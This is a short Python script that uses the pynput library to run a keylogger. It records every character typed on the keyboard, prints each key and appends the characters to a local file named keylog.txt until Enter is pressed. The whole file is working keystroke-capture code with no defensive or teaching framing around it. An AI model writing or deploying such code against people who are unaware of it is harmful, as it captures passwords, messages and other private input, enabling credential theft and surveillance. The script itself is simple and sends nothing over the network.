from pynput import keyboard

def keyPressed(key):
    print(key)
    with open('keylog.txt', 'a') as keylog:
        try:
            char = key.char
            keylog.write(char)
        except:
            print("Error: could not get key")
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
    listener.stop()